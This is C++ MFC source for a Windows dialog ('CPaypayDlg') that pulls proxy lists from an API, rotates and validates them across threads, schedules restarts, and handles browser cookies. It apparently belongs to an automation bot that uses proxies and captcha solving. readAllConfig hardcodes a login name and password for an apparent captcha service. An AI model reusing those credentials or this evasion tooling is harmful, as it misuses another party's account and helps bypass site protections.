	TCHAR szFilePath[MAX_PATH + 1]={0};
	GetModuleFileName(NULL, szFilePath, MAX_PATH);
	(_tcsrchr(szFilePath, _T('\\')))[1] = 0;
	CString str_url = szFilePath; 
	g_use_proxy_path = wstring(szFilePath) + wstring(L"can_use_proxy.txt");
	ofstream outfile(g_use_proxy_path); 
	for(unsigned int i = 0; i < g_use_daili.size(); ++i)
	{
		string dd = string(g_use_daili[i].begin(),g_use_daili[i].end()) + "\n";
		outfile<<dd;
	}
	outfile.close(); 
	((CPaypayDlg*)lpParamter)->GetDlgItem(IDC_BUTTON4)->EnableWindow(true);
	((CPaypayDlg*)lpParamter)->GetDlgItem(IDC_BUTTON4)->SetWindowText(L"更新代理");
	//((CPaypayDlg*)lpParamter)->MessageBox(_T("验证代理完成"),NULL,MB_OK);
	CString str;
	((CPaypayDlg*)lpParamter)->m_time.GetWindowText(str);
	wstring ee = wstring( str.GetString());
	string eee = string(ee.begin(),ee.end());
	g_timer = atoi(eee.c_str()) * 60;
	if ( BST_CHECKED == ((CPaypayDlg*)lpParamter)->IsDlgButtonChecked( IDC_CHECK3 ) )
	{
		((CPaypayDlg*)lpParamter)->SetTimer(1,1000,NULL);
	}
	return 0;
}

void CPaypayDlg::OnBnClickedButton4()//更新代理按钮
{
	// TODO: 在此添加控件通知处理程序代码
	//	CString str;
	//	m_daili_address.GetWindowText(str);
	//	if(str == "")
	//	{
	//		MessageBox(_T("请输入代理api地址!"),NULL,MB_OK);
	//		return ;
	//	}
	//	WritePrivateProfileString(L"pay",L"daili_address",str.GetString(),g_ini_file_path.c_str());
	//	WinHttpClient WinClient(str.GetString());
	//	WinClient.SendHttpRequest(L"GET");
	//	string temp(WinClient.m_responseContent.begin(),WinClient.m_responseContent.end());
	//	stringstream ss(temp.c_str());
	//	while(true)
	//	{
	//		string daili = "";
	//		ss>>daili;
	//		if (daili == "")
	//		{
	//			break;
	//		}
	//		if (daili == "errorCode=-9")
	//		{
	//			MessageBox(_T("该网站代理无效，请换其他网址试试"),NULL,MB_OK);
	//			return ;
	//		}
	//		wstring proxy(daili.begin(),daili.end());
	//		g_all_daili.push_back(proxy);
	//	}
	//	g_all_daili_num = g_all_daili.size();
	//	GetDlgItem(IDC_BUTTON4)->EnableWindow(false);
	//	GetDlgItem(IDC_BUTTON4)->SetWindowText(L"更新中.....");
	//	fun_hMutex = CreateMutex(NULL, FALSE, NULL);
	//	for(unsigned int i = 0;i < 5; i++)
	//		for(unsigned int j = 0;j < 50;j++)
	//	{
	//		g_fun_handles[i][j] = CreateThread(NULL, 0, fun, (LPVOID)this, 0, NULL);
	//	}
	//	
	//	HANDLE handle = CreateThread(NULL, 0, waitProxy, (LPVOID)this, 0, NULL);
	//	CloseHandle(handle);
	//
	//	int sss = 0;

}


void CPaypayDlg::OnBnClickedCheck2()
{
	// TODO: 在此添加控件通知处理程序代码
	// TODO: 在此添加控件通知处理程序代码
	if ( BST_CHECKED == IsDlgButtonChecked( IDC_CHECK2 ) )
	{
		g_useCODE = true;
	}
	else
	{
		g_useCODE = false;
	}
	if (g_useCODE)
	{
		WritePrivateProfileString(L"pay",L"code",L"1",g_ini_file_path.c_str());
	}
	else
	{
		WritePrivateProfileString(L"pay",L"code",L"0",g_ini_file_path.c_str());

	}
	
}


void CPaypayDlg::OnBnClickedButton3()
{
	// TODO: 在此添加控件通知处理程序代码
	GetDlgItem(IDC_BUTTON3)->EnableWindow(false);
	is_break = false;
	//for(unsigned int i = 0; i < g_part_one;i++)
	//{
	//	WaitForMultipleObjects(64, g_execute_handles[i], TRUE, INFINITE);
	//}
	//WaitForMultipleObjects(g_part_two, g_execute_handles[g_part_one], TRUE, INFINITE);


	
}


void CALLBACK TimerProc(HWND hWnd,UINT nMsg,UINT nTimerid,DWORD dwTime)
{
    g_timer = g_timer - 1;
	if (g_timer == 0 )
	{
		KillTimer(hWnd,1);

	}

}

void CPaypayDlg::OnBnClickedCheck3()
{
	// TODO: 在此添加控件通知处理程序代码
	if ( BST_CHECKED == IsDlgButtonChecked( IDC_CHECK3 ) )
	{
		

		CString str;
		m_time.GetWindowText(str);
		if (str == "")
		{
			MessageBox(_T("请输入更新间隔，并重新勾选"),NULL,MB_OK);
			return ;
		}
		wstring ee = wstring( str.GetString());
		string eee = string(ee.begin(),ee.end());
		int num = atoi(eee.c_str());
		if (num < 1)
		{
			MessageBox(_T("更新间隔最少为1分钟，重新输入并重新勾选"),NULL,MB_OK);
			return ;
		}
		WritePrivateProfileString(L"pay",L"timer",str,g_ini_file_path.c_str());
		m_daili_address.GetWindowText(str);
		if(str == "")
		{
			MessageBox(_T("请输入代理api地址，并重新勾选"),NULL,MB_OK);
			return ;
		}
		g_use_auto_update = true;
		WritePrivateProfileString(L"pay",L"auto_update",L"1",g_ini_file_path.c_str());
		g_timer = num * 60;
		//SetTimer(1,1000,NULL);
	}
	else
	{
		KillTimer(1);
		g_use_auto_update = false;
		WritePrivateProfileString(L"pay",L"auto_update",L"0",g_ini_file_path.c_str());
	}
}

void CPaypayDlg::readAllConfig()
{
	CString val;

	GetPrivateProfileString(L"pay",L"chongqi",L"",val.GetBuffer(MAX_PATH),MAX_PATH,g_ini_file_path.c_str());
	if (!val.CompareNoCase(L"1"))//相等
	{
		g_used_chongqi = true;
		((CButton *)GetDlgItem(IDC_CHECK4))->SetCheck(TRUE);
	}
	else
	{
		g_used_chongqi = false;
		((CButton *)GetDlgItem(IDC_CHECK4))->SetCheck(FALSE);
	}
	GetPrivateProfileString(L"pay",L"chongqi_time",L"",val.GetBuffer(MAX_PATH),MAX_PATH,g_ini_file_path.c_str());
	SetDlgItemText(IDC_EDIT6,val);
	CString str;
	m_chongqi.GetWindowText(str);
	wstring ee = wstring( str.GetString());
	string eee = string(ee.begin(),ee.end());
	g_chongqi_time = atoi(eee.c_str()) * 60 * 60;

	GetPrivateProfileString(L"pay",L"zhanghao",L"",val.GetBuffer(MAX_PATH),MAX_PATH,g_ini_file_path.c_str());
	SetDlgItemText(IDC_EDIT2,val);
	GetPrivateProfileString(L"pay",L"daili_address",L"",val.GetBuffer(MAX_PATH),MAX_PATH,g_ini_file_path.c_str());
	SetDlgItemText(IDC_EDIT1,val);
	GetPrivateProfileString(L"pay",L"daili",L"",val.GetBuffer(MAX_PATH),MAX_PATH,g_ini_file_path.c_str());
	if (!val.CompareNoCase(L"1"))//相等
	{
		g_useHTTP = true;
		((CButton *)GetDlgItem(IDC_CHECK1))->SetCheck(TRUE);
	}
	else
	{
		g_useHTTP = false;
		((CButton *)GetDlgItem(IDC_CHECK1))->SetCheck(FALSE);
	}
	GetPrivateProfileString(L"pay",L"code",L"",val.GetBuffer(MAX_PATH),MAX_PATH,g_ini_file_path.c_str());
	if (!val.CompareNoCase(L"1"))//相等
	{
		g_useCODE = true;
		((CButton *)GetDlgItem(IDC_CHECK2))->SetCheck(TRUE);
	}
	else
	{
		g_useCODE= false;
		((CButton *)GetDlgItem(IDC_CHECK2))->SetCheck(FALSE);
	}
	GetPrivateProfileString(L"pay",L"thread_num",L"",val.GetBuffer(MAX_PATH),MAX_PATH,g_ini_file_path.c_str());
	SetDlgItemText(IDC_EDIT4,val);
	GetPrivateProfileString(L"pay",L"timer",L"",val.GetBuffer(MAX_PATH),MAX_PATH,g_ini_file_path.c_str());
	if (val != "")
	{
		SetDlgItemText(IDC_EDIT3,val);
	}
	else
	{
		SetDlgItemText(IDC_EDIT3,L"20");
	}
	
	GetPrivateProfileString(L"pay",L"time_out",L"",val.GetBuffer(MAX_PATH),MAX_PATH,g_ini_file_path.c_str());
	if (val != "")
	{
		SetDlgItemText(IDC_EDIT5,val);
	}
	else
	{
		SetDlgItemText(IDC_EDIT5,L"3");
	}
	

	m_time.GetWindowText(str);
	ee = wstring( str.GetString());
	eee = string(ee.begin(),ee.end());
	g_timer = atoi(eee.c_str()) * 60;
	GetPrivateProfileString(L"pay",L"auto_update",L"",val.GetBuffer(MAX_PATH),MAX_PATH,g_ini_file_path.c_str());
	if (!val.CompareNoCase(L"1"))//相等
	{
		((CButton *)GetDlgItem(IDC_CHECK3))->SetCheck(TRUE);
		g_use_auto_update = true;
		//SetTimer(1,1000,NULL);
	}
	else
	{
		g_use_auto_update = false;
		((CButton *)GetDlgItem(IDC_CHECK3))->SetCheck(FALSE);
	}
	GetPrivateProfileString(L"pay",L"rk_name",L"",val.GetBuffer(MAX_PATH),MAX_PATH,g_ini_file_path.c_str());
	if (!val.CompareNoCase(L""))
	{
		g_rk_name = L"killer0822";
		WritePrivateProfileString(L"pay",L"rk_name",g_rk_name.c_str(),g_ini_file_path.c_str());
	}
	else
	{
		g_rk_name = val;
	}
	GetPrivateProfileString(L"pay",L"rk_passward",L"",val.GetBuffer(MAX_PATH),MAX_PATH,g_ini_file_path.c_str());
	if (!val.CompareNoCase(L""))
	{
		g_rk_passward = L"5131420";
		WritePrivateProfileString(L"pay",L"rk_passward",g_rk_passward.c_str(),g_ini_file_path.c_str());
	}
	else
	{
		g_rk_passward = val;
	}

}

DWORD WINAPI auto_update_daili_execute(LPVOID lpParamter)
{
	CString str;
	((CPaypayDlg*)lpParamter)->m_daili_address.GetWindowText(str);
	if (str == "")
	{
		((CPaypayDlg*)lpParamter)->MessageBox(_T("请输入代理api地址!"), NULL, MB_OK);
		((CPaypayDlg*)lpParamter)->SetTimer(1, 1000, NULL);
		return 0;
	}
	WritePrivateProfileString(L"pay", L"daili_address", str.GetString(), g_ini_file_path.c_str());
	((CPaypayDlg*)lpParamter)->GetDlgItem(IDC_BUTTON4)->EnableWindow(false);
	((CPaypayDlg*)lpParamter)->GetDlgItem(IDC_BUTTON4)->SetWindowText(L"更新中.....");
	((CPaypayDlg*)lpParamter)->m_list_box.InsertString(0, L"更新中.....");
	WinHttpClient WinClient(str.GetString());
	WinClient.SendHttpRequest(L"GET");
	string temp(WinClient.m_responseContent.begin(), WinClient.m_responseContent.end());
	stringstream ss(temp.c_str());

	g_all_daili_cache.clear();
	g_unUsed_daili_cache.clear();

	while (true)
	{
		string daili = "";
		ss >> daili;
		if (daili == "")
		{
			break;
		}
		if (daili == "errorCode=-9")
		{
			((CPaypayDlg*)lpParamter)->MessageBox(_T("该网站代理无效，请换其他网址并重新勾选"), NULL, MB_OK);
			return 0;
		}
		wstring proxy(daili.begin(), daili.end());
		g_all_daili_cache.push_back(proxy);
	}

	TCHAR szFilePath[MAX_PATH + 1] = { 0 };
	GetModuleFileName(NULL, szFilePath, MAX_PATH);
	(_tcsrchr(szFilePath, _T('\\')))[1] = 0;
	CString str_url = szFilePath;
	wstring mie = wstring(szFilePath) + wstring(L"unUsedDaili.txt");
	ifstream file_stream(mie);
	char buffer[4096];
	if (!file_stream.is_open())
	{

	}
	else
	{
		while (!file_stream.eof())
		{
			string proxy;
			file_stream.getline(buffer, 100);
			stringstream ss(buffer);
			ss >> proxy;
			g_unUsed_daili_cache.push_back(wstring(proxy.begin(), proxy.end()));
		}
	}
	vector<wstring>::iterator iter = g_unUsed_daili_cache.begin();
	for (iter; iter != g_unUsed_daili_cache.end(); ++iter)
	{
		wstring daili = *iter;
		vector<wstring>::iterator result = find(g_all_daili_cache.begin(), g_all_daili_cache.end(), daili);
		if (result != g_all_daili_cache.end())
		{
			g_all_daili_cache.erase(result);
		}
	}

	WaitForSingleObject(hMutex, INFINITE);
	g_proxy_index = 0;
	if (g_unUsed_daili_cache.size() > 0)
	{
		g_unUsed_daili.clear();
		g_unUsed_daili.assign(g_unUsed_daili_cache.begin(), g_unUsed_daili_cache.end());
	}

	if (g_all_daili_cache.size() > 0)
	{
		g_all_daili.clear();
		g_all_daili.assign(g_all_daili_cache.begin(), g_all_daili_cache.end());
	}

	ReleaseMutex(hMutex);
	g_all_daili_num = g_all_daili.size();
	((CPaypayDlg*)lpParamter)->GetDlgItem(IDC_BUTTON4)->EnableWindow(true);
	((CPaypayDlg*)lpParamter)->GetDlgItem(IDC_BUTTON4)->SetWindowText(L"更新");

	CString strf;
	((CPaypayDlg*)lpParamter)->m_time.GetWindowText(strf);
	wstring ee = wstring(strf.GetString());
	string eee = string(ee.begin(), ee.end());
	g_timer = atoi(eee.c_str()) * 60;
	if (BST_CHECKED == ((CPaypayDlg*)lpParamter)->IsDlgButtonChecked(IDC_CHECK3))
	{
		((CPaypayDlg*)lpParamter)->SetTimer(1, 1000, NULL);
	}
	return 0;
}



void CPaypayDlg::OnTimer(UINT_PTR nIDEvent)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	
	CDialog::OnTimer(nIDEvent);
	if (nIDEvent == 1 && GetDlgItem(IDC_BUTTON4)->IsWindowEnabled())
	{
		g_timer = g_timer - 1;
		if (g_timer == 0 )
		{
			KillTimer(1);

			HANDLE hSignalThread = CreateThread(NULL, 0, auto_update_daili_execute, (LPVOID)this, 0, NULL);
			


		}
	}
	if (nIDEvent == 2)
	{
		//HWND hwnd = ::FindWindow(NULL, _T("脚本错误"));
		//if (hwnd)
		//{
		//	::SendMessage(hwnd,WM_CLOSE,0,0);
		//}
	}
	if (nIDEvent == 3)
	{
		g_chongqi_time = g_chongqi_time - 1;
		int temp = g_chongqi_time;
		CString str,str1;
		str1.Format(L"剩余 %d天",temp/(3600 * 24));   
		str = str1;
		temp%=(3600 * 24);   
		str1.Format(L"%d时",temp/3600);   
		str += str1;    
		temp%=3600;   
		str1.Format(L"%d分",temp/60);   
		str += str1;   
		temp%=60;   
		str1.Format(L"%d秒",temp);
		str += str1;
		SetDlgItemText(IDC_STATIC26,str);
		if (g_chongqi_time <= 0)
		{
			KillTimer(3);
			ReStart(true);
		}
	}
	if (nIDEvent == 5)
	{
		g_shanchu_daili_time = g_shanchu_daili_time - 1;
		if (g_shanchu_daili_time <= 0)
		{
			g_shanchu_daili_time = 60 * 60 + 23;
			TCHAR szFilePath[MAX_PATH + 1] = { 0 };
			GetModuleFileName(NULL, szFilePath, MAX_PATH);
			(_tcsrchr(szFilePath, _T('\\')))[1] = 0;
			wstring saved_path = wstring(szFilePath) + wstring(L"unUsedDaili.txt");
			DeleteFile(saved_path.c_str());
		}
	}
	else if (nIDEvent == 10)
	{
		//m_iee.Refresh();
	}
}


void CPaypayDlg::OnStnClickedStatic7()
{
	// TODO: 在此添加控件通知处理程序代码
}


void CPaypayDlg::OnClose()
{
	// TODO:  在此添加消息处理程序代码和/或调用默认值
	ExitProcess(0);
	CDialog::OnClose();
}


void CPaypayDlg::OnStnClickedStatic19()
{
	// TODO: 在此添加控件通知处理程序代码
}


void CPaypayDlg::OnBnClickedCheck4()
{
	// TODO: 在此添加控件通知处理程序代码
	// TODO: 在此添加控件通知处理程序代码
	if ( BST_CHECKED == IsDlgButtonChecked( IDC_CHECK4 ) )
	{
		CString str;
		m_chongqi.GetWindowText(str);
		if (str == "")
		{
			MessageBox(_T("请输入重启时间，并重新勾选"),NULL,MB_OK);
			return ;
		}
		wstring ee = wstring( str.GetString());
		string eee = string(ee.begin(),ee.end());
		int num = atoi(eee.c_str());
		if (num < 1)
		{
			MessageBox(_T("更新间隔最少为1小时，重新输入并重新勾选"),NULL,MB_OK);
			return ;
		}
		WritePrivateProfileString(L"pay",L"chongqi_time",str,g_ini_file_path.c_str());

		g_used_chongqi = true;
		WritePrivateProfileString(L"pay",L"chongqi",L"1",g_ini_file_path.c_str());
		g_chongqi_time = num * 60*60;
	}
	else
	{
		g_used_chongqi = false;
		WritePrivateProfileString(L"pay",L"chongqi",L"0",g_ini_file_path.c_str());
		KillTimer(3);
	}
}
BEGIN_EVENTSINK_MAP(CPaypayDlg, CDialog)
	ON_EVENT(CPaypayDlg, IDC_EXPLORER1, 259, CPaypayDlg::DocumentCompleteExplorer1, VTS_DISPATCH VTS_PVARIANT)
	ON_EVENT(CPaypayDlg, IDC_EXPLORER2, 259, CPaypayDlg::DocumentCompleteExplorer2, VTS_DISPATCH VTS_PVARIANT)
END_EVENTSINK_MAP()


void CPaypayDlg::DocumentCompleteExplorer1(LPDISPATCH pDisp, VARIANT* URL)
{
	// TODO: 在此处添加消息处理程序代码
	m_cookieProcess.visitExplorerCallBack(pDisp,URL);
}


void CPaypayDlg::DocumentCompleteExplorer2(LPDISPATCH pDisp, VARIANT* URL)
{
	// TODO: 在此处添加消息处理程序代码
	m_cookieProcess_1.visitExplorerCallBack(pDisp,URL);
}
